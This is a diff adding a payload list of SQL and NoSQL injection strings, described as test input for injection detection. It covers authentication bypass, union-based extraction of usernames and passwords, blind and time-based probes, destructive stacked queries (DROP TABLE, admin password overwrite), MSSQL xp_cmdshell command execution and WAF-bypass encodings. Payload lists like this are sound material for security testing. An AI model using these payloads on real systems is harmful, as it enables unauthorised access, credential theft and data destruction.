@@ -1,0 +1,85 @@
+# SQL Injection Payloads
+# Each line is a test payload for SQL injection detection
+
+# Authentication bypass
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+admin' --
+admin'/*
+') OR ('1'='1
+') OR ('1'='1' --
+
+# Error-based
+' AND 1=CONVERT(int, @@version) --
+' AND 1=1 --
+' AND 1=2 --
+1' ORDER BY 1 --
+1' ORDER BY 10 --
+' HAVING 1=1 --
+' GROUP BY column_name HAVING 1=1 --
+
+# Union-based
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT NULL, NULL, NULL --
+1' UNION SELECT 1,2,3 --
+' UNION SELECT username, password FROM users --
+' UNION ALL SELECT 1,2,3,4,5 --
+
+# Time-based blind
+1' AND SLEEP(5) --
+1' WAITFOR DELAY '0:0:5' --
+1'; WAITFOR DELAY '0:0:5' --
+1' AND (SELECT SLEEP(5)) --
+1' AND BENCHMARK(5000000, SHA1('test')) --
+1'; SELECT pg_sleep(5) --
+
+# Boolean-based blind
+1' AND 1=1 --
+1' AND 1=2 --
+1' AND SUBSTRING(@@version,1,1)='5' --
+1' AND (SELECT COUNT(*) FROM users) > 0 --
+
+# Stacked queries
+1'; DROP TABLE test --
+1'; INSERT INTO users VALUES('hacker','pass') --
+1'; UPDATE users SET password='hacked' WHERE username='admin' --
+
+# MySQL-specific
+' OR 1=1 #
+' UNION SELECT table_name FROM information_schema.tables #
+' AND extractvalue(1, concat(0x7e, version())) --
+
+# MSSQL-specific
+'; EXEC xp_cmdshell('dir') --
+' AND 1=CONVERT(int, db_name()) --
+
+# PostgreSQL-specific
+' AND 1=CAST(version() AS int) --
+'; SELECT version() --
+
+# Oracle-specific
+' AND 1=utl_inaddr.get_host_name('127.0.0.1') --
+' UNION SELECT banner FROM v$version --
+
+# Generic
+1 OR 1=1
+1' OR ''='
+" OR ""="
+OR 1=1
+OR 1=1 --
+
+# NoSQL Injection (MongoDB)
+{"$gt":""}
+{"$ne":""}
+' || '1'=='1
+{"$regex":".*"}
+true, $where: '1 == 1'
+
+# WAF Bypass techniques
+/*!50000UNION*//*!50000SELECT*/1,2,3
+%55nion %53elect 1,2,3
+' aNd 1=1 --
